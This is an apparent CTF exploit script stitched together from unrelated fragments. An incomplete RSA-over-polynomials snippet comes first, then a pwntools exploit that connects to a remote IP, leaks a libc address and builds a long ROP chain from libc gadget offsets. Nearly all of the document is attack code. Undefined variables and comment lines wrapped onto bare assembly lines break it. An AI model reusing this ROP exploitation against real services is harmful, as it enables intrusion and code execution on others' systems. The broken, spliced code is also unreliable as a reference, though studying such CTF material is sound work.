e = 31337
m = "aaaaaaaaaaaaaaaa"
m_int = Integer(m.encode('hex'), 16)
m_poly = R.fetch_int(m_int)
m_poly = P(m_poly)
c_poly = pow(m_poly, e, n)
mmm    = pow(c_poly, d, n)
print format(R(mmm).integer_representation(), '0256x')
c_int = R(c_poly).integer_representation()
c = format(c_int, '0256x')
from pwn import *
#p=process('./flropyd')
p=remote('111.186.63.203', 6666)
p.recvuntil('ress: 0x')
addr = int(p.recvuntil('\n')[:-1],16)
libc_base = addr-(0x7f6bd9720070-  0x7f6bd9689000)
info("libc:0x%x",libc_base)
raw_input()
ret     = 0x00000000000008aa +libc_base
pop_rdx = 0x0000000000001b96 +libc_base
lea_rax = 0x0000000000145c98 +libc_base# mov rax, qword ptr [rax] ; ret
pop_rax = 0x00000000000439c8 +libc_base
sete    = 0x00000000000306d5 +libc_base
setne   = 0x0000000000089378 +libc_base
pop_r12 = 0x0000000000023992 +libc_base
pop_rbx = 0x000000000002cb49 +libc_base
pop_rcx = 0x000000000003eb0b +libc_base
mov_rdi_rsp_call_rdx = 0x000000000015c4ce+libc_base
rax_2   = 0x00000000000d0df7 +libc_base
addraxrcx=0x00000000000ab9f8 +libc_base#: add rax, rcx ; ret
addraxrdi=0x00000000000a8473 +libc_base# : add rax, rdi ; ret
movrspr8= 0x000000000003eca9 +libc_base #: mov rsp, r8 ; mov rbp, r9 ; nop ; 
jmp rdx
movr8rax= 0x0000000000106899 +libc_base#: mov r8, rax ; call r12
xorrax  = 0x00000000000b17c5 +libc_base#: xor rax, rax ; ret
#0x00000000000586ed : mov rax, rdi ; ret
#0x00000000001404f5 : sal esi, cl ; ret
leardx  = 0x000000000003093c +libc_base# : mov qword ptr [rdx], rax ; ret
pop_rdi = 0x000000000002155f +libc_base#: pop rdi ; ret
salbl = 0x00000000000d0bdf +libc_base#: sal bl, 1 ; ret
salsi = 0x00000000001404f5 +libc_base#: sal esi, cl ; ret
movaxbx =0x0000000000043ce7 +libc_base#: mov rax, rbx ; pop rbx ; ret
movbxax = 0x0000000000133226 +libc_base# : mov rbx, rax ; mov rax, rbx ; pop 
rbx ; pop rbp ; ret
subaxcx = 0x00000000000a9e4c +libc_base#: sub eax, ecx ; ret
leardi  = 0x00000000001011aa +libc_base#: mov qword ptr [rdx], rdi ; ret
cmpaxbx = 0x000000000010ea12 +libc_base#: cmp rax, rbx ; seta al ; pop rbx ; 
ret
pop_r15  = 0x000000000002155e +libc_base#: pop r15 ; ret
pop_rsi = 0x0000000000023e6a +libc_base#: pop rsi; ret;
pop_r14 = 0x0000000000023e69+libc_base
movsibx = 0x000000000011df81+libc_base# : mov esi, ebx ; mov rdi, r13 ; call 
r14
addaxsi = 0x00000000000ac21c+libc_base# : add rax, rsi ; ret
salsi = 0x00000000001404f5 +libc_base#: sal esi, cl ; ret
salbx = 0x00000000001180fe +libc_base#: sal ebx, 1; ret;  
addaxbx = 0x0000000000131be6+libc_base#: add rax, rbx; pop rbx; pop rbp; pop 
r12; pop r13; ret;
leaaxdi = 0x0000000000097055+libc_base#: mov qword ptr [rax], rdi; ret; 
movbxdx = 0x000000000005d3b8+libc_base#: mov ebx, edx; jmp rax; 
movdxax = 0x00000000001415dd+libc_base#: mov rdx, rax; ret; 
rop = 'a'*0x18
rop+= p64(pop_rax)
rop+= p64(0x602060)#k
rop+= p64(lea_rax)#N
rop+= p64(pop_rdx)
rop+= p64(0x61afc0)#j
rop+= p64(leardx)
rop+= p64(pop_rdx)
rop+= p64(0x61afc8)#i
rop+= p64(leardx)
rop+= p64(leardx)
rop+= p64(pop_rdx)
rop+= p64(0x61afe0)#backup
rop+= p64(leardx)
###start
rop+= p64(pop_rdx)
rop+= p64(pop_rdx)
rop+= p64(mov_rdi_rsp_call_rdx)#  W[(j 1584->1608
tmp4 = rop
print "tmp4"
print len(tmp4)-len(tmp1)+24
#------------------------------------------
rop+= p64(pop_rcx)# 1624->1648
tmp5 = rop
print "tmp5"
print len(tmp5)-len(tmp1)+24
rop+= p64(pop_rdx)
rop+= p64(ret)
rop+= p64(movrspr8)
#W[k + (j << 6)] = W[(i << 6) + k] + W[(j << 6) + i];
leasi = 0x0000000000052419+libc_base#: mov rsi, qword ptr [rsi + 0x70]; xor 
eax, eax; ret; 
leasiax = 0x000000000008995a+libc_base#: mov qword ptr [rsi], rax; xor eax, 
eax; ret;
leadidx = 0x00000000000a815f +libc_base#: mov qword ptr [rdi], rdx ; ret
rop+= p64(pop_rsi)
rop+= p64(0x61af00-0x70)#W[(j << 6) + k]
rop+= p64(leasi)
leadiax = 0x00000000000586ea +libc_base#: mov qword ptr [rdi], rax ; mov rax, 
rdi ; ret
leadxax = 0x000000000003093c +libc_base#: mov qword ptr [rdx], rax ; ret
#####0x61af20
rop+= p64(pop_rax)
rop+= p64(0x61af20)
rop+= p64(lea_rax)